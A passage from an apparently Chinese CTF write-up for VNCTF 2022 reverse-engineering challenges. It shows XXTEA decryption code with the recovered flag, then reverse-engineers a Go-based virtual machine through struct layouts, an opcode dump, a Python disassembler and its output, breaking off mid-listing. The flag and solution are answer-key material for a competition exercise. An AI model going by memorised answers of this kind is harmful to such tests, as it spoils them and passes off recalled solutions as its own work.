(y &lt;&lt; 2)) + ((y &gt;&gt; 3) ^ (z &lt;&lt; 4))) ^ ((sum ^ y) + (key[(p &amp; 3) ^ e] ^ z))); z = v[n - 1]; rounds--; &#125;&#125;void decrypt(unsigned int* v, int n, unsigned int* key)&#123; unsigned int rounds = (52 / n) + 6; unsigned int sum =0 - (1640531527 * rounds), z = 0; unsigned int p; unsigned int y = v[0]; while (rounds &gt; 0) &#123; unsigned int e = (sum &gt;&gt; 2) &amp; 3; for (p = n - 1; p &gt; 0; p--) &#123; z = v[p - 1]; v[p] -= ((((z &gt;&gt; 5) ^ (y &lt;&lt; 2)) + ((y &gt;&gt; 3) ^ (z &lt;&lt; 4))) ^ ((sum ^ y) + (key[(p &amp; 3) ^ e] ^ z))); y = v[p]; &#125; z = v[n - 1]; v[0] -= ((((z &gt;&gt; 5) ^ (y &lt;&lt; 2)) + ((y &gt;&gt; 3) ^ (z &lt;&lt; 4))) ^ ((sum ^ y) + (key[(p &amp; 3) ^ e] ^ z))); y = v[0]; sum += 1640531527; rounds--; &#125;&#125;int main() &#123; char c[] = &#123; 68, 39, -92, 108, -82, -18, 72, -55, 74, -56, 38, 11, 60, 84, 97, -40, 87, 71, 99, -82, 120, 104, 47, -71, -58, -57, 0, 33, 42, 38, -44, -39, -60, 113, -2, 92, -75, 118, -77, 50, -121, 43, 32, -106 &#125;; unsigned int key[] = &#123; 1349530696, 1314283353, 558257219, 1333153569 &#125;; decrypt((unsigned int *)c, 11, key); return 0;&#125;//VNCTF&#123;93ee7688-f216-42cb-a5c2-191ff4e412ba&#125; 3.cm狗拿到题目，发现是用go语言实现的VM，直接用IDA7.6打开 根据main.(_ptr_MzVm).init 和 main.(_ptr_MzVm).run 2个函数，找到VM的大体结构 123456789101112131415161718192021struct func&#123; void *call; vm *vmm;&#125;struct vm&#123; DWORD REG[21]; DWORD stack[1000]; DWORD _eip; DWORD _esp; DWORD _ebp; QWORD * data; //指向OPCODE func * function[100]; char is_exit;&#125;;struct params&#123; DWORD parm1; DWORD parm2;&#125; 添加结构体到IDA中，发现瞬间函数变的非常的清晰 慢慢分析每个func的功能，然后把OPCODE提取出来，写脚本打印伪代码 123456789101112131415161718192021222324252627282930313233a = [0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000057, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000065, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x0000006C, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000063, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x0000006F, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x0000006D, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000065, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000020, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000074, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x0000006F, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000020, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000056, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x0000004E, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000043, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000054, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000046, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000032, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000030, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000032, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000032, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000021, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x0000000A, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000069, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x0000006E, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000070, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000075, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000074, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000020, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000066, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x0000006C, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000061, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000067, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x0000003A, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x0000000A, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000013, 0x00000049, 0x00000001, 0x00000003, 0x00000000, 0x00000001, 0x00000001, 0x0000002B, 0x00000001, 0x00000002, 0x00000001, 0x00000061, 0x00000000, 0x00000000, 0x00000005, 0x00000000, 0x00000000, 0x00000008, 0x00000001, 0x00000002, 0x0000000E, 0x00000001, 0x00000003, 0x00000001, 0x00000000, 0x00000000, 0x00000005, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000001, 0x00000005, 0x00000100, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x00000006, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x00000006, 0x00000000, 0x00000002, 0x00000000, 0x00000006, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x00000006, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x00000006, 0x00000000, 0x00000002, 0x00000000, 0x00000006, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x00000006, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x00000006, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000001, 0x00000005, 0x00000100, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x00000007, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x00000007, 0x00000000, 0x00000002, 0x00000000, 0x00000007, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x00000007, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x00000007, 0x00000000, 0x00000002, 0x00000000, 0x00000007, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x00000007, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x00000007, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000001, 0x00000005, 0x00000100, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x00000008, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x00000008, 0x00000000, 0x00000002, 0x00000000, 0x00000008, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x00000008, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x00000008, 0x00000000, 0x00000002, 0x00000000, 0x00000008, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x00000008, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x00000008, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000001, 0x00000005, 0x00000100, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x00000009, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x00000009, 0x00000000, 0x00000002, 0x00000000, 0x00000009, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x00000009, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x00000009, 0x00000000, 0x00000002, 0x00000000, 0x00000009, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x00000009, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x00000009, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000001, 0x00000005, 0x00000100, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x0000000A, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x0000000A, 0x00000000, 0x00000002, 0x00000000, 0x0000000A, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x0000000A, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x0000000A, 0x00000000, 0x00000002, 0x00000000, 0x0000000A, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x0000000A, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x0000000A, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000001, 0x00000005, 0x00000100, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x0000000B, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x0000000B, 0x00000000, 0x00000002, 0x00000000, 0x0000000B, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x0000000B, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x0000000B, 0x00000000, 0x00000002, 0x00000000, 0x0000000B, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x0000000B, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x0000000B, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000001, 0x00000005, 0x00000100, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x0000000C, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x0000000C, 0x00000000, 0x00000002, 0x00000000, 0x0000000C, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x0000000C, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x0000000C, 0x00000000, 0x00000002, 0x00000000, 0x0000000C, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x0000000C, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x0000000C, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000001, 0x00000005, 0x00000100, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x0000000D, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x0000000D, 0x00000000, 0x00000002, 0x00000000, 0x0000000D, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x0000000D, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x0000000D, 0x00000000, 0x00000002, 0x00000000, 0x0000000D, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x0000000D, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x0000000D, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000001, 0x00000005, 0x00000100, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x0000000E, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x0000000E, 0x00000000, 0x00000002, 0x00000000, 0x0000000E, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x0000000E, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x0000000E, 0x00000000, 0x00000002, 0x00000000, 0x0000000E, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x0000000E, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x0000000E, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000001, 0x00000005, 0x00000100, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x0000000F, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x0000000F, 0x00000000, 0x00000002, 0x00000000, 0x0000000F, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x0000000F, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x0000000F, 0x00000000, 0x00000002, 0x00000000, 0x0000000F, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x0000000F, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x0000000F, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000001, 0x00000005, 0x00000100, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x00000010, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x00000010, 0x00000000, 0x00000002, 0x00000000, 0x00000010, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x00000010, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x00000010, 0x00000000, 0x00000002, 0x00000000, 0x00000010, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x00000010, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x00000010, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000005, 0x00000006, 0x00000000, 0x00000005, 0x00000007, 0x00000000, 0x00000005, 0x00000008, 0x00000000, 0x00000005, 0x00000009, 0x00000000, 0x00000005, 0x0000000A, 0x00000000, 0x00000005, 0x0000000B, 0x00000000, 0x00000005, 0x0000000C, 0x00000000, 0x00000005, 0x0000000D, 0x00000000, 0x00000005, 0x0000000E, 0x00000000, 0x00000005, 0x0000000F, 0x00000000, 0x00000005, 0x00000010, 0x00000000, 0x00000006, 0x00000001, 0x00000000, 0x00000006, 0x00000002, 0x00000000, 0x00000001, 0x00000014, 0x0000011C, 0x00000001, 0x00000000, 0x00000154, 0x0000000C, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0xE8D1D5DF, 0x00000001, 0x00000013, 0x00000183, 0x00000001, 0x00000014, 0x00000153, 0x0000000E, 0x00000001, 0x00000000, 0x00000001, 0x00000000, 0xF5E3C114, 0x0000000E, 0x00000002, 0x00000000, 0x00000006, 0x00000001, 0x00000000, 0x00000006, 0x00000002, 0x00000000, 0x00000001, 0x00000014, 0x00000127, 0x00000001, 0x00000000, 0x00000154, 0x0000000C, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x228EC216, 0x00000001, 0x00000013, 0x00000183, 0x00000001, 0x00000014, 0x00000153, 0x0000000E, 0x00000001, 0x00000000, 0x00000001, 0x00000000, 0x89D45A61, 0x0000000E, 0x00000002, 0x00000000, 0x00000006, 0x00000001, 0x00000000, 0x00000006, 0x00000002, 0x00000000, 0x00000001, 0x00000014, 0x00000132, 0x00000001, 0x00000000, 0x00000154, 0x0000000C, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x655B8F69, 0x00000001, 0x00000013, 0x00000183, 0x00000001, 0x00000014, 0x00000153, 0x0000000E, 0x00000001, 0x00000000, 0x00000001, 0x00000000, 0x2484A07A, 0x0000000E, 0x00000002, 0x00000000, 0x00000006, 0x00000001, 0x00000000, 0x00000006, 0x00000002, 0x00000000, 0x00000001, 0x00000014, 0x0000013D, 0x00000001, 0x00000000, 0x00000154, 0x0000000C, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0xD9E5E7F8, 0x00000001, 0x00000013, 0x00000183, 0x00000001, 0x00000014, 0x00000153, 0x0000000E, 0x00000001, 0x00000000, 0x00000001, 0x00000000, 0x3A441532, 0x0000000E, 0x00000002, 0x00000000, 0x00000006, 0x00000001, 0x00000000, 0x00000006, 0x00000002, 0x00000000, 0x00000001, 0x00000014, 0x00000148, 0x00000001, 0x00000000, 0x00000154, 0x0000000C, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x91AB7E88, 0x00000001, 0x00000013, 0x00000183, 0x00000001, 0x00000014, 0x00000153, 0x0000000E, 0x00000001, 0x00000000, 0x00000001, 0x00000000, 0x69FC64BC, 0x0000000E, 0x00000002, 0x00000000, 0x00000006, 0x00000001, 0x00000000, 0x00000001, 0x00000000, 0x007D3765, 0x0000000E, 0x00000001, 0x00000000, 0x00000001, 0x00000000, 0x00000189, 0x0000000C, 0x00000000, 0x00000000, 0x00000063, 0x00000000, 0x00000000, 0x00000001, 0x00000003, 0x9E3779B9, 0x00000001, 0x00000004, 0x00095C4C, 0x00000001, 0x00000005, 0x0000871D, 0x00000001, 0x00000006, 0x0001A7B7, 0x00000001, 0x00000007, 0x0012C7C7, 0x00000001, 0x00000008, 0x00000000, 0x00000001, 0x00000011, 0x00000010, 0x00000001, 0x00000012, 0x00000020, 0x00000001, 0x00000013, 0x00000160, 0x00000001, 0x0000000A, 0x00000000, 0x00000001, 0x0000000B, 0x00000020, 0x00000001, 0x0000000C, 0x00000001, 0x00000007, 0x00000008, 0x00000003, 0x00000002, 0x00000000, 0x00000002, 0x0000000A, 0x00000000, 0x00000011, 0x00000007, 0x00000000, 0x00000004, 0x00000002, 0x0000000E, 0x00000000, 0x00000002, 0x00000000, 0x00000002, 0x00000007, 0x00000000, 0x00000008, 0x00000002, 0x0000000F, 0x00000000, 0x00000002, 0x00000000, 0x00000002, 0x00000009, 0x00000000, 0x00000012, 0x00000007, 0x00000000, 0x00000005, 0x00000002, 0x00000010, 0x00000000, 0x00000002, 0x00000000, 0x0000000E, 0x0000000B, 0x00000000, 0x0000000F, 0x0000000B, 0x00000000, 0x00000010, 0x00000007, 0x00000001, 0x00000000, 0x00000002, 0x00000000, 0x00000001, 0x0000000A, 0x00000000, 0x00000011, 0x00000007, 0x00000000, 0x00000006, 0x00000002, 0x0000000E, 0x00000000, 0x00000002, 0x00000000, 0x00000001, 0x00000007, 0x00000000, 0x00000008, 0x00000002, 0x0000000F, 0x00000000, 0x00000002, 0x00000000, 0x00000001, 0x00000009, 0x00000000, 0x00000012, 0x00000007, 0x00000000, 0x00000007, 0x00000002, 0x00000010, 0x00000000, 0x00000002, 0x00000000, 0x0000000E, 0x0000000B, 0x00000000, 0x0000000F, 0x0000000B, 0x00000000, 0x00000010, 0x00000007, 0x00000002, 0x00000000, 0x00000008, 0x0000000B, 0x0000000C, 0x0000000E, 0x0000000B, 0x0000000A, 0x0000000C, 0x00000014, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x0000006E, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x0000006F, 0x00000062, 0x00000000, 0x00000000, 0x0000000C, 0x00000014, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000079, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000065, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000073, 0x00000062, 0x00000000, 0x00000000, 0x0000000C, 0x00000014, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000]# print(len(a))# for i in range(0, len(a), 3):# print(a[i], a[i+1], a[i+2])asmmm_map = &#123; 0: &quot;nop&quot;, 1: &quot;VM-&gt;REG[&#123;0&#125;] = &#123;1&#125;&quot;, 2: &quot;VM-&gt;REG[&#123;0&#125;] = VM-&gt;REG[&#123;1&#125;]&quot;, # 指定位置的数据传给指定的寄存器 3: &quot;v3 = (VM-&gt;stack_top - &#123;1&#125;) VM-&gt;REG[&#123;0&#125;] = VM-&gt;stack[v3];&quot;, 4: &quot;result = (VM-&gt;stack_top - &#123;0&#125;) VM-&gt;stack[result] = VM-&gt;REG[&#123;1&#125;]&quot;, 5: &quot;push REG[&#123;0&#125;]&quot;, 6: &quot;pop REG[&#123;0&#125;]&quot;, 7: &quot;VM-&gt;REG[&#123;0&#125;] += VM-&gt;REG[&#123;1&#125;]&quot;, 8: &quot;VM-&gt;REG[&#123;0&#125;] -= VM-&gt;REG[&#123;1&#125;]&quot;, 9: &quot;VM-&gt;REG[&#123;0&#125;] /= VM-&gt;REG[&#123;1&#125;]&quot;, 10: &quot;VM-&gt;REG[&#123;0&#125;] *= VM-&gt;REG[&#123;1&#125;];&quot;, 11: &quot;VM-&gt;REG[&#123;0&#125;] ^= VM-&gt;REG[&#123;1&#125;]&quot;, 12: &quot;VM-&gt;_eip = 3 * VM-&gt;REG[&#123;0&#125;]&quot;, 13: &quot;CMP VM-&gt;REG[&#123;1&#125;], VM-&gt;REG[&#123;0&#125; if yes: VM-&gt;_eip = 3 * VM-&gt;REG[19]&quot;, 14: &quot;CMP VM-&gt;REG[&#123;1&#125;], VM-&gt;REG[&#123;0&#125;] if yes: VM-&gt;_eip = 3 * VM-&gt;REG[19]&quot;, 15: &quot;VM-&gt;REG[&#123;1&#125;] &lt; VM-&gt;REG[&#123;0&#125;] if yes: VM-&gt;_eip = 3 * VM-&gt;REG[19]&quot;, 16: &quot;VM-&gt;REG[&#123;1&#125;] &gt; VM-&gt;REG[&#123;0&#125;] if yes: VM-&gt;_eip = 3 * VM-&gt;REG[19]&quot;, 97: &quot;getchar&quot;, 98: &quot;putchar&quot;, 99: &quot;vm quit&quot;&#125;for i in range(0, len(a), 3): print(asmmm_map[a[i]].format(a[i+1], a[i+2])) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402VM-&gt;REG[0] = 87 putcharVM-&gt;REG[0] = 101putcharVM-&gt;REG[0] = 108putcharVM-&gt;REG[0] = 99 putcharVM-&gt;REG[0] = 111putcharVM-&gt;REG[0] = 109putcharVM-&gt;REG[0] = 101putcharVM-&gt;REG[0] = 32 putcharVM-&gt;REG[0] = 116putcharVM-&gt;REG[0] = 111putcharVM-&gt;REG[0] = 32putcharVM-&gt;REG[0] = 86putcharVM-&gt;REG[0] = 78putcharVM-&gt;REG[0] = 67putcharVM-&gt;REG[0] = 84putcharVM-&gt;REG[0] = 70putcharVM-&gt;REG[0] = 50putcharVM-&gt;REG[0] = 48putcharVM-&gt;REG[0] = 50putcharVM-&gt;REG[0] = 50putcharVM-&gt;REG[0] = 33putcharVM-&gt;REG[0] = 10putcharVM-&gt;REG[0] = 105putcharVM-&gt;REG[0] = 110putcharVM-&gt;REG[0] = 112putcharVM-&gt;REG[0] = 117putcharVM-&gt;REG[0] = 116putcharVM-&gt;REG[0] = 32putcharVM-&gt;REG[0] = 102putcharVM-&gt;REG[0] = 108putcharVM-&gt;REG[0] = 97putcharVM-&gt;REG[0] = 103putcharVM-&gt;REG[0] = 58putcharVM-&gt;REG[0] = 10putcharVM-&gt;REG[19] = 73VM-&gt;REG[3] = 0VM-&gt;REG[1] = 43VM-&gt;REG[2] = 1getcharpush REG[0]VM-&gt;REG[1] -= VM-&gt;REG[2]CMP VM-&gt;REG[3], VM-&gt;REG[1] if yes: VM-&gt;_eip = 3 * VM-&gt;REG[19] //输入flag，长度是43VM-&gt;REG[0] = 0push REG[0]nopnoppop REG[0]VM-&gt;REG[5] = 256VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[6] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[6] += VM-&gt;REG[0]VM-&gt;REG[0] = VM-&gt;REG[6]VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[6] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[6] += VM-&gt;REG[0]VM-&gt;REG[0] = VM-&gt;REG[6]VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[6] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[6] += VM-&gt;REG[0]noppop REG[0]VM-&gt;REG[5] = 256VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[7] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[7] += VM-&gt;REG[0]VM-&gt;REG[0] = VM-&gt;REG[7]VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[7] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[7] += VM-&gt;REG[0]VM-&gt;REG[0] = VM-&gt;REG[7]VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[7] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[7] += VM-&gt;REG[0]noppop REG[0]VM-&gt;REG[5] = 256VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[8] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[8] += VM-&gt;REG[0]VM-&gt;REG[0] = VM-&gt;REG[8]VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[8] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[8] += VM-&gt;REG[0]VM-&gt;REG[0] = VM-&gt;REG[8]VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[8] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[8] += VM-&gt;REG[0]noppop REG[0]VM-&gt;REG[5] = 256VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[9] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[9] += VM-&gt;REG[0]VM-&gt;REG[0] = VM-&gt;REG[9]VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[9] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[9] += VM-&gt;REG[0]VM-&gt;REG[0] = VM-&gt;REG[9]VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[9] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[9] += VM-&gt;REG[0]noppop REG[0]VM-&gt;REG[5] = 256VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[10] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[10] += VM-&gt;REG[0]VM-&gt;REG[0] = VM-&gt;REG[10]VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[10] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[10] += VM-&gt;REG[0]VM-&gt;REG[0] = VM-&gt;REG[10]VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[10] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[10] += VM-&gt;REG[0]noppop REG[0]VM-&gt;REG[5] = 256VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[11] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[11] += VM-&gt;REG[0]VM-&gt;REG[0] = VM-&gt;REG[11]VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[11] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[11] += VM-&gt;REG[0]VM-&gt;REG[0] = VM-&gt;REG[11]VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[11] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[11] += VM-&gt;REG[0]noppop REG[0]VM-&gt;REG[5] = 256VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[12] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[12] += VM-&gt;REG[0]VM-&gt;REG[0] = VM-&gt;REG[12]VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[12] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[12] += VM-&gt;REG[0]VM-&gt;REG[0] = VM-&gt;REG[12]VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[12] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[12] += VM-&gt;REG[0]noppop REG[0]VM-&gt;REG[5] = 256VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[13] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[13] += VM-&gt;REG[0]VM-&gt;REG[0] = VM-&gt;REG[13]VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[13] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[13] += 